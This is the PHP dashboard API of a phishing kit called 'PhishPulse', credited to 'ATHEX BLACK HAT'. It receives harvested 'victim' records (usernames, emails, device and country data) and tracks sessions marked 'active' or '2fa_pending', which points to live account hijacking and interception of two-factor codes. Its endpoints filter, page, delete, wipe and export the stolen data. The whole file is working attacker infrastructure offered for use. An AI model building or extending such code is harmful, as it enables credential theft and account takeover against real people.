<?php
/**
 * PhishPulse - Dashboard API
 * Handles data receiving from app.py and AJAX requests
 * Version: 1.0
 * Author: ATHEX BLACK HAT
 */

require_once 'config.php';

// Set headers
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Get action from query string
$action = $_GET['action'] ?? '';

// Get JSON input
$input = json_decode(file_get_contents('php://input'), true);

// Route actions
switch ($action) {
    case 'add_victim':
        handle_add_victim($input);
        break;
    
    case 'add_visitor':
        handle_add_visitor($input);
        break;
    
    case 'get_data':
        handle_get_data();
        break;
    
    case 'get_stats':
        handle_get_stats();
        break;
    
    case 'delete_victim':
        handle_delete_victim($_GET['id'] ?? 0);
        break;
    
    case 'delete_session':
        handle_delete_session($_GET['session_id'] ?? '');
        break;
    
    case 'clear_all':
        handle_clear_all();
        break;
    
    case 'export':
        handle_export();
        break;
    
    default:
        echo json_encode(['error' => 'Invalid action']);
        break;
}

/**
 * Handle: Add new victim data
 */
function handle_add_victim($data) {
    if (!$data) {
        echo json_encode(['error' => 'No data provided']);
        return;
    }
    
    add_victim($data);
    
    echo json_encode([
        'success' => true,
        'message' => 'Victim added successfully',
        'id' => $data['id'] ?? null
    ]);
}

/**
 * Handle: Add new visitor
 */
function handle_add_visitor($data) {
    if (!$data) {
        echo json_encode(['error' => 'No data provided']);
        return;
    }
    
    add_visitor($data);
    
    echo json_encode([
        'success' => true,
        'message' => 'Visitor added successfully'
    ]);
}

/**
 * Handle: Get all data for dashboard
 */
function handle_get_data() {
    $victims = read_json(VICTIMS_FILE);
    $sessions = read_json(SESSIONS_FILE);
    $visitors = read_json(VISITORS_FILE);
    $stats = get_stats();
    
    // Get filter parameters
    $filter = $_GET['filter'] ?? 'all';
    $platform = $_GET['platform'] ?? 'all';
    $search = $_GET['search'] ?? '';
    $page = intval($_GET['page'] ?? 1);
    $per_page = intval($_GET['per_page'] ?? 20);
    
    // Filter victims
    $filtered_victims = $victims;
    
    if ($filter !== 'all') {
        $filtered_victims = array_filter($filtered_victims, function($v) use ($filter) {
            return ($v['status'] ?? '') === $filter;
        });
    }
    
    if ($platform !== 'all') {
        $filtered_victims = array_filter($filtered_victims, function($v) use ($platform) {
            return ($v['platform'] ?? '') === $platform;
        });
    }
    
    if ($search) {
        $search_lower = strtolower($search);
        $filtered_victims = array_filter($filtered_victims, function($v) use ($search_lower) {
            return strpos(strtolower($v['username'] ?? ''), $search_lower) !== false ||
                   strpos(strtolower($v['profile']['email'] ?? ''), $search_lower) !== false ||
                   strpos(strtolower($v['device']['country'] ?? ''), $search_lower) !== false;
        });
    }
    
    // Re-index array
    $filtered_victims = array_values($filtered_victims);
    
    // Pagination
    $total = count($filtered_victims);
    $total_pages = ceil($total / $per_page);
    $offset = ($page - 1) * $per_page;
    $paged_victims = array_slice($filtered_victims, $offset, $per_page);
    
    // Active sessions
    $active_sessions = array_filter($sessions, function($s) {
        return in_array($s['status'], ['active', '2fa_pending']);
    });
    
    echo json_encode([
        'success' => true,
        'stats' => $stats,
        'victims' => $paged_victims,
        'sessions' => array_values($active_sessions),
        'all_sessions' => $sessions,
        'pagination' => [
            'current_page' => $page,
            'per_page' => $per_page,
            'total' => $total,
            'total_pages' => $total_pages
        ],
        'timestamp' => date('Y-m-d H:i:s')
    ]);
}

/**
 * Handle: Get statistics only
 */
function handle_get_stats() {
    $stats = get_stats();
    echo json_encode([
        'success' => true,
        'stats' => $stats,
        'timestamp' => date('Y-m-d H:i:s')
    ]);
}

/**
 * Handle: Delete single victim
 */
function handle_delete_victim($id) {
    $victims = read_json(VICTIMS_FILE);
    
    $victims = array_filter($victims, function($v) use ($id) {
        return ($v['id'] ?? 0) != $id;
    });
    
    write_json(VICTIMS_FILE, array_values($victims));
    
    echo json_encode([
        'success' => true,
        'message' => 'Victim deleted successfully'
    ]);
}

/**
 * Handle: Delete session
 */
function handle_delete_session($session_id) {
    $sessions = read_json(SESSIONS_FILE);
    
    $sessions = array_filter($sessions, function($s) use ($session_id) {
        return ($s['session_id'] ?? '') !== $session_id;
    });
    
    write_json(SESSIONS_FILE, array_values($sessions));
    
    echo json_encode([
        'success' => true,
        'message' => 'Session deleted successfully'
    ]);
}

/**
 * Handle: Clear all data
 */
function handle_clear_all() {
    write_json(VICTIMS_FILE, []);
    write_json(VISITORS_FILE, []);
    write_json(SESSIONS_FILE, []);
    
    echo json_encode([
        'success' => true,
        'message' => 'All data cleared successfully'
    ]);
}

/**
 * Handle: Export data as JSON
 */
function handle_export() {
    $data = [
        'victims' => read_json(VICTIMS_FILE),
        'sessions' => read_json(SESSIONS_FILE),
        'visitors' => read_json(VISITORS_FILE),
        'stats' => get_stats(),
        'exported_at' => date('Y-m-d H:i:s'),
        'tool' => TOOL_NAME,
        'version' => DASHBOARD_VERSION,
    ];
    
    header('Content-Disposition: attachment; filename="phishpulse_export_' . date('Y-m-d_His') . '.json"');
    echo json_encode($data, JSON_PRETTY_PRINT);
    exit;
}
?>